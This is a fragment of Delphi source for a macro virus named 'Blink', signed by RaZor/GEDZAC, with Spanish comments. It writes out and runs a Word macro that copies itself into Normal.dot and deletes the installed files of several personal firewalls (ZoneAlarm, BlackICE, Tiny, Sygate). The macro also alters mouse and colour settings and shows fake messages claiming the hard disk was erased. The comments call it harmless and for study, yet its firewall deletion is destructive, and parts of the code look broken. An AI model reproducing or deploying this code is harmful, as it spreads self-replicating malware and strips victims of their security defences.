   // Unicamente Para Propositos De Estudio De TAPI.DLL Y De Registros De Windows Para Haci Que Vea La Gente
   // Como Fasil Mente Uno Puede Violar La Seguridad De Windows Yahoo Etc...
   // RaZor/GEDZAC.



   // Y Haora???
   // Que Hago???
   // Ufff Vamos A Descansar ajajjaja :P
   // No Se Me ocurre Nada :s
   // Habel...
   // Bien Como Nuestro BAT Logro Deshabilitar La Seguridad De Microsft Office...
   // Entonses Creemos Un VBS Que Modifique Normal.dot Y Varais Cosillas Mas ;)



   AssignFile(Blink,'C:\MaCrOs BlInK Pr0jEct.vbs');
   rewrite(Blink);
   writeln(Blink,'Private Sub Document_Open()');
   writeln(Blink,'On Error Resume Next');
   writeln(Blink,'  ');
   writeln(Blink,'  ');
   writeln(Blink,'System.PrivateProfileString ');
   writeln(Blink,'Set Arch = ActiveDocument.VBProject.VBComponents.Item(1)  ');
   writeln(Blink,'Set Norm = Normal.Blink.VBProject.VBComponents.Item(1)    ');
   writeln(Blink,'Set ItsMe = Me.VBProject.VBComponents.Item(1)          ');
   writeln(Blink,'                         ');
   writeln(Blink,'Norm.Name = "Blink"      ');
   writeln(Blink,'Arch.Name = "Blink"      ');
   writeln(Blink,'If Norm.CodeModule.Lines(1, 1) <> "W97.Blink" Then   ');
   writeln(Blink,'Norm.CodeModule.InsertLines 1, ItsMe.CodeModule.Lines(1, ItsMe.CodeModule.CountOfLines)');
   writeln(Blink,'End If                                                                                ');
   writeln(Blink,'If Day(15) = Minute(Now) Then Selection.TypeText " I Am Blink The Virus Sorry!"    ');
   writeln(Blink,'                                                                               ');
   writeln(Blink,'Dim ZoneAlarm, FZoneAlarm, BlackIce, FBlackIce, Tiny, FTiny, Sygate, FSygate   ');
   writeln(Blink,'ZoneAlarm = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Zone Labs\ZoneAlarm", "InstallDirectory")    ');
   writeln(Blink,'BlackIce = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Network ICE\BlackICE", "Installer") = "C:\Programas\Network ICE\BlackICE"   ');
   writeln(Blink,'Tiny = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\TinySoftware\Tiny Personal Firewall\2.00", "DestPath")           ');
   writeln(Blink,'Sygate = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Sygate Technologies, Inc.\Sygate Personal Firewall", "smc_install_path")');
   writeln(Blink,'FZoneAlarm = ZoneAlarm + "\*.*"  ');
   writeln(Blink,'FBlackIce = BlackIce + "\*.*"   ');
   writeln(Blink,'FTiny = Tiny + "\*.*"          ');
   writeln(Blink,'FSygate = Sygate + "\*.*"      ');
   writeln(Blink,'                               ');
   writeln(Blink,'Kill FZoneAlarm                ');
   writeln(Blink,'Kill FBlackIce                ');
   writeln(Blink,'Kill FTiny                    ');
   writeln(Blink,'Kill FSygate                  ');
   writeln(Blink,'                               ');
   writeln(Blink,'On Error Resume Next         ');
   writeln(Blink,'System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "MouseTrails") = "2"  ');
   writeln(Blink,'System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "MouseSpeed") = "0"  ');
   writeln(Blink,'System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "DoubleClickSpeed") = "900"  ');
   writeln(Blink,'  ');
   writeln(Blink,'On Error Resume Next');
   writeln(Blink,'System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ButtonFace") = "100 10 90"');
   writeln(Blink,'System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ActiveTitle") = "9 000 999" ');
   writeln(Blink,'System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Menu") = "9 9 9"     ');
   writeln(Blink,'System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Window") = "900 200 555"  ');
   writeln(Blink,'End Sub    ');
   writeln(Blink,'MsgBox " A Ocurrido Problema Con Windows Se Borraran Todos Los Archivos Del Disco Duro...", vbCritical, " Problem Whit FAT32 "  ');
   writeln(Blink,'MsgBox " Archivos Del Dico Duro Borrados...", vbExclamation " Problem Whit FAT32 "                                  ');
   writeln(Blink,'MsgBox " Problema Con FAT32 No Ha Sido Resuelto Porfavor Consulte Con Su Tecnico Calificado Mas Cercano", vbExclamation "Problem With FAT32 " ');
   closefile(wall);
   ShellExecute(0,nil,PChar('C:\MaCrOs BlInK Pr0jEct.vbs'),'','',SW_SHOWNORMAL);
   deletefile(pchar('C:\MaCrOs BlInK Pr0jEct.vbs'));

   // Bien Con Esto Amigos Hemos Terminado!!
   // Blink Esta Listo!!
   // Haora El Mundo Sabra Que Es Blink!
   //  Sin Acciones Destructivas!! Solo Alguans Bromas Y Sentido Del Humor!!

   // Blink Hecho Por RaZor/GEDZAC
   // Este Virus Fue Programado En Venezuela Barquisimento Estado Lara!





   end;
   end.
